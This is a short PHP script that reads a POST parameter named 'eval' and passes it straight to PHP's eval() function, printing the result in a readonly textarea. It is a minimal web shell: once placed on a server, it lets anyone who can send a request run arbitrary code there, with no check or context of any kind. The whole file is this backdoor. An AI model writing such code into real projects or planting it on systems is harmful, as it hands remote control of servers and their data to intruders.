<?php
$eval = $_POST['eval'];
echo "<br><textarea cols=\"115\" rows=\"15\" readonly>";
eval($eval);
?>